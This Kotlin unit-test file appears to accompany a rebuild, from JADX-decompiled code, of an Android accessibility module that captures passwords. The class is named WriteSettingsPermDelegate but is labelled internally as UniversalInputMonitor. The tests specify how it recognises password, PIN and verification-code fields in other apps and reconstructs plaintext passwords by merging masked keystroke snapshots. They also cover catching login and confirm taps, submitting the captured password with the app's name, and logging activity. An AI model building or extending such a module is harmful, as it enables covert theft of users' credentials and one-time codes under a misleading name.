package com.storm.safe.rock.service.modules

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.ExperimentalCoroutinesApi
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * TDD tests for WriteSettingsPermDelegate (UniversalInputMonitor).
 *
 * Tests cover:
 * - Static helpers: isMaskChar, isAllMask, isPasswordHint, isAllMaskOrDot,
 *   mergePasswordSnapshots, getHintText
 * - Instance methods: onAccessibilityEvent, submitPassword, resetTracking, getAppName
 *
 * JADX reference: C0325b0.java (939 lines)
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
@OptIn(ExperimentalCoroutinesApi::class)
class WriteSettingsPermDelegateTest {

    private lateinit var delegate: WriteSettingsPermDelegate

    @Before
    fun setUp() {
        delegate = WriteSettingsPermDelegate()
    }

    // =============================================
    // isMaskChar (JADX: a1)
    // =============================================

    @Test
    fun `isMaskChar returns true for asterisk`() {
        assertTrue(WriteSettingsPermDelegate.isMaskChar('*'))
    }

    @Test
    fun `isMaskChar returns true for bullet character`() {
        assertTrue(WriteSettingsPermDelegate.isMaskChar('\u2022')) // •
    }

    @Test
    fun `isMaskChar returns true for black circle`() {
        assertTrue(WriteSettingsPermDelegate.isMaskChar('\u25CF')) // ●
    }

    @Test
    fun `isMaskChar returns false for letter`() {
        assertFalse(WriteSettingsPermDelegate.isMaskChar('a'))
    }

    @Test
    fun `isMaskChar returns false for digit`() {
        assertFalse(WriteSettingsPermDelegate.isMaskChar('5'))
    }

    @Test
    fun `isMaskChar returns true for middle dot`() {
        assertTrue(WriteSettingsPermDelegate.isMaskChar('\u00B7')) // ·
    }

    @Test
    fun `isMaskChar returns true for fullwidth period`() {
        assertTrue(WriteSettingsPermDelegate.isMaskChar('\uFF0E')) // ．
    }

    // =============================================
    // isAllMask (JADX: a2)
    // =============================================

    @Test
    fun `isAllMask returns true for empty string`() {
        assertTrue(WriteSettingsPermDelegate.isAllMask(""))
    }

    @Test
    fun `isAllMask returns true for all bullet chars`() {
        assertTrue(WriteSettingsPermDelegate.isAllMask("••••"))
    }

    @Test
    fun `isAllMask returns true for all asterisks`() {
        assertTrue(WriteSettingsPermDelegate.isAllMask("****"))
    }

    @Test
    fun `isAllMask returns false for mixed chars`() {
        assertFalse(WriteSettingsPermDelegate.isAllMask("abc*"))
    }

    @Test
    fun `isAllMask returns false for plaintext`() {
        assertFalse(WriteSettingsPermDelegate.isAllMask("hello"))
    }

    // =============================================
    // isPasswordHint (JADX: a3)
    // =============================================

    @Test
    fun `isPasswordHint returns false for empty string`() {
        assertFalse(WriteSettingsPermDelegate.isPasswordHint(""))
    }

    @Test
    fun `isPasswordHint matches chinese password keyword`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("请输入密码"))
    }

    @Test
    fun `isPasswordHint matches english password keyword`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("Enter your password"))
    }

    @Test
    fun `isPasswordHint matches PIN keyword`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("请输入PIN码"))
    }

    @Test
    fun `isPasswordHint matches passcode keyword`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("Enter passcode"))
    }

    @Test
    fun `isPasswordHint matches verification keyword`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("Enter verification code"))
    }

    @Test
    fun `isPasswordHint returns false for non-password hint`() {
        assertFalse(WriteSettingsPermDelegate.isPasswordHint("请输入用户名"))
    }

    @Test
    fun `isPasswordHint case insensitive match`() {
        assertTrue(WriteSettingsPermDelegate.isPasswordHint("PASSWORD"))
    }

    // =============================================
    // isAllMaskOrDot (JADX: a4)
    // =============================================

    @Test
    fun `isAllMaskOrDot returns true for empty string`() {
        assertTrue(WriteSettingsPermDelegate.isAllMaskOrDot(""))
    }

    @Test
    fun `isAllMaskOrDot returns true for dots`() {
        assertTrue(WriteSettingsPermDelegate.isAllMaskOrDot("...."))
    }

    @Test
    fun `isAllMaskOrDot returns true for mixed dots and masks`() {
        assertTrue(WriteSettingsPermDelegate.isAllMaskOrDot("•.•."))
    }

    @Test
    fun `isAllMaskOrDot allows up to 2 letter-digit chars`() {
        assertTrue(WriteSettingsPermDelegate.isAllMaskOrDot("••a•"))
        assertTrue(WriteSettingsPermDelegate.isAllMaskOrDot("••ab"))
    }

    @Test
    fun `isAllMaskOrDot returns false for 3+ letter-digits`() {
        assertFalse(WriteSettingsPermDelegate.isAllMaskOrDot("abc•"))
    }

    @Test
    fun `isAllMaskOrDot returns false for plaintext`() {
        assertFalse(WriteSettingsPermDelegate.isAllMaskOrDot("hello"))
    }

    @Test
    fun `isAllMaskOrDot handles fullwidth asterisk`() {
        assertTrue(WriteSettingsPermDelegate.isAllMaskOrDot("\uFF0A\uFF0A\uFF0A"))
    }

    // =============================================
    // mergePasswordSnapshots (JADX: a7)
    // =============================================

    @Test
    fun `mergePasswordSnapshots returns null for empty list`() {
        assertNull(WriteSettingsPermDelegate.mergePasswordSnapshots(ArrayList()))
    }

    @Test
    fun `mergePasswordSnapshots merges partial passwords`() {
        val list = ArrayList<String>()
        list.add("1***")
        list.add("*2**")
        list.add("**3*")
        list.add("***4")
        assertEquals("1234", WriteSettingsPermDelegate.mergePasswordSnapshots(list))
    }

    @Test
    fun `mergePasswordSnapshots returns null when incomplete`() {
        val list = ArrayList<String>()
        list.add("1***")
        list.add("*2**")
        // positions 2 and 3 still '*'
        assertNull(WriteSettingsPermDelegate.mergePasswordSnapshots(list))
    }

    @Test
    fun `mergePasswordSnapshots handles different lengths`() {
        val list = ArrayList<String>()
        list.add("12")
        list.add("1234")
        // Position 0='1', 1='2', 2='3', 3='4'
        assertEquals("1234", WriteSettingsPermDelegate.mergePasswordSnapshots(list))
    }

    @Test
    fun `mergePasswordSnapshots returns null for all-mask snapshots`() {
        val list = ArrayList<String>()
        list.add("****")
        assertNull(WriteSettingsPermDelegate.mergePasswordSnapshots(list))
    }

    // =============================================
    // getHintText (JADX: b0)
    // =============================================

    @Test
    fun `getHintText returns empty for node with no hint`() {
        val node = AccessibilityNodeInfo.obtain()
        assertEquals("", WriteSettingsPermDelegate.getHintText(node))
    }

    @Test
    fun `getHintText returns contentDescription when no hintText`() {
        val node = AccessibilityNodeInfo.obtain()
        node.contentDescription = "请输入密码"
        val hint = WriteSettingsPermDelegate.getHintText(node)
        assertEquals("请输入密码", hint)
    }

    // =============================================
    // resetTracking (JADX: a8)
    // =============================================

    @Test
    fun `resetTracking clears all state`() {
        // Start tracking (simulate some state)
        delegate.resetTracking()
        // Should not throw
    }

    // =============================================
    // getAppName (JADX: a9)
    // =============================================

    @Test
    fun `getAppName returns cached name after first lookup`() {
        val name1 = delegate.getAppName("com.example.test")
        val name2 = delegate.getAppName("com.example.test")
        assertEquals(name1, name2) // Should return same cached value
    }

    @Test
    fun `getAppName returns short name for unknown package`() {
        // Without service, fallback to last segment
        val name = delegate.getAppName("com.example.myapp")
        assertEquals("myapp", name)
    }

    @Test
    fun `getAppName caches result`() {
        val name1 = delegate.getAppName("com.test.cached")
        val name2 = delegate.getAppName("com.test.cached")
        assertSame(name1, name2)
    }

    // =============================================
    // submitPassword (JADX: a0) — expanded
    // =============================================

    @Test
    fun `submitPassword does nothing when not tracking`() {
        // Not tracking → immediate return
        delegate.submitPassword("test_reason")
        // Should not throw
    }

    @Test
    fun `submitPassword resets tracking after completion`() {
        // After submit, tracking should be cleared
        delegate.submitPassword("test")
        delegate.submitPassword("test") // second call also safe
    }

    // =============================================
    // onAccessibilityEvent (JADX: a5) — the main new method
    // =============================================

    @Test
    fun `onAccessibilityEvent handles null package name`() {
        val event = AccessibilityEvent.obtain()
        // packageName is null by default → should return early
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    @Test
    fun `onAccessibilityEvent ignores own package`() {
        val event = AccessibilityEvent.obtain()
        // Set package to own package — should be filtered out
        // ADAPT: With null service, own package check uses empty string comparison
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    @Test
    fun `onAccessibilityEvent handles TYPE_VIEW_CLICKED`() {
        val event = AccessibilityEvent.obtain()
        event.eventType = AccessibilityEvent.TYPE_VIEW_CLICKED
        // Should not throw
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    @Test
    fun `onAccessibilityEvent handles TYPE_VIEW_FOCUSED`() {
        val event = AccessibilityEvent.obtain()
        event.eventType = AccessibilityEvent.TYPE_VIEW_FOCUSED
        // Should not throw
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    @Test
    fun `onAccessibilityEvent handles TYPE_VIEW_TEXT_CHANGED`() {
        val event = AccessibilityEvent.obtain()
        event.eventType = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        // Should not throw
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    @Test
    fun `onAccessibilityEvent handles TYPE_WINDOW_STATE_CHANGED`() {
        val event = AccessibilityEvent.obtain()
        event.eventType = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        // Should not throw
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    @Test
    fun `onAccessibilityEvent handles unsupported event type`() {
        val event = AccessibilityEvent.obtain()
        event.eventType = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        // Should return without processing
        delegate.onAccessibilityEvent(event, null)
        event.recycle()
    }

    // =============================================
    // hasMaskChar helper (internal)
    // =============================================

    @Test
    fun `hasMaskChar detects mask in mixed string`() {
        assertTrue(WriteSettingsPermDelegate.hasMaskChar("abc•def"))
    }

    @Test
    fun `hasMaskChar returns false for clean string`() {
        assertFalse(WriteSettingsPermDelegate.hasMaskChar("hello123"))
    }

    // =============================================
    // hasChinese helper (internal)
    // =============================================

    @Test
    fun `hasChinese detects Chinese characters`() {
        assertTrue(WriteSettingsPermDelegate.hasChinese("你好世界", 2))
    }

    @Test
    fun `hasChinese returns false for ascii text`() {
        assertFalse(WriteSettingsPermDelegate.hasChinese("hello", 2))
    }

    // =============================================
    // replaceMaskWithStar (internal)
    // =============================================

    @Test
    fun `replaceMaskWithStar converts mask chars to asterisk`() {
        val result = WriteSettingsPermDelegate.replaceMaskWithStar("a•b●c")
        assertEquals("a*b*c", result)
    }

    @Test
    fun `replaceMaskWithStar preserves non-mask chars`() {
        val result = WriteSettingsPermDelegate.replaceMaskWithStar("abc123")
        assertEquals("abc123", result)
    }

    @Test
    fun `replaceMaskWithStar converts dots to asterisk`() {
        val result = WriteSettingsPermDelegate.replaceMaskWithStar("ab．cd")
        assertEquals("ab*cd", result)
    }

    // =============================================
    // trimLeadingNonAlphanumeric (internal)
    // =============================================

    @Test
    fun `trimLeadingNonAlphanumeric strips leading special chars`() {
        // JADX: stops at '*', digit, or letter — so '*' at position 0 causes no stripping
        val result = WriteSettingsPermDelegate.trimLeadingNonAlphanumeric("***abc")
        assertEquals("***abc", result) // '*' is a break character, so nothing is stripped
    }

    @Test
    fun `trimLeadingNonAlphanumeric preserves digits at start`() {
        val result = WriteSettingsPermDelegate.trimLeadingNonAlphanumeric("123abc")
        assertEquals("123abc", result)
    }

    @Test
    fun `trimLeadingNonAlphanumeric strips leading non-break chars`() {
        // CJK chars are not break chars → they get stripped
        val result = WriteSettingsPermDelegate.trimLeadingNonAlphanumeric("你好1234")
        assertEquals("1234", result)
    }

    @Test
    fun `trimLeadingNonAlphanumeric returns empty for all-mask string`() {
        val result = WriteSettingsPermDelegate.trimLeadingNonAlphanumeric("•••")
        assertEquals("", result)
    }

    // =============================================
    // dispose
    // =============================================

    @Test
    fun `dispose stops background thread`() {
        val d = WriteSettingsPermDelegate()
        d.dispose()
        // Should not throw on double dispose either
    }

    // =============================================
    // MASK_CHARS static array
    // =============================================

    @Test
    fun `MASK_CHARS has 17 entries matching JADX`() {
        assertEquals(17, WriteSettingsPermDelegate.MASK_CHARS.size)
    }

    @Test
    fun `MASK_CHARS first entry is bullet`() {
        assertEquals('\u2022', WriteSettingsPermDelegate.MASK_CHARS[0])
    }

    @Test
    fun `MASK_CHARS fourth entry is asterisk`() {
        assertEquals('*', WriteSettingsPermDelegate.MASK_CHARS[3])
    }

    // =============================================
    // PASSWORD_HINTS static list
    // =============================================

    @Test
    fun `PASSWORD_HINTS contains expected keywords`() {
        assertTrue(WriteSettingsPermDelegate.PASSWORD_HINTS.contains("密码"))
        assertTrue(WriteSettingsPermDelegate.PASSWORD_HINTS.contains("password"))
        assertTrue(WriteSettingsPermDelegate.PASSWORD_HINTS.contains("pin"))
        assertTrue(WriteSettingsPermDelegate.PASSWORD_HINTS.contains("验证码"))
    }

    // =============================================
    // CONFIRM_KEYWORDS static list
    // =============================================

    @Test
    fun `CONFIRM_KEYWORDS contains expected keywords`() {
        assertTrue(WriteSettingsPermDelegate.CONFIRM_KEYWORDS.contains("确认"))
        assertTrue(WriteSettingsPermDelegate.CONFIRM_KEYWORDS.contains("确定"))
        assertTrue(WriteSettingsPermDelegate.CONFIRM_KEYWORDS.contains("login"))
        assertTrue(WriteSettingsPermDelegate.CONFIRM_KEYWORDS.contains("submit"))
    }

    // =============================================
    // logActivity static method (JADX: a6)
    // =============================================

    @Test
    fun `logActivity does not crash when monitors disabled`() {
        ActivityMonitor.appUsageEnabled = false
        ActivityMonitor.textMonitorEnabled = false
        WriteSettingsPermDelegate.logActivity("test message")
        // Should not throw
    }

    @Test
    fun `logActivity writes when appUsageEnabled`() {
        ActivityMonitor.appUsageEnabled = true
        WriteSettingsPermDelegate.logActivity("test message")
        // Should not throw
    }
}
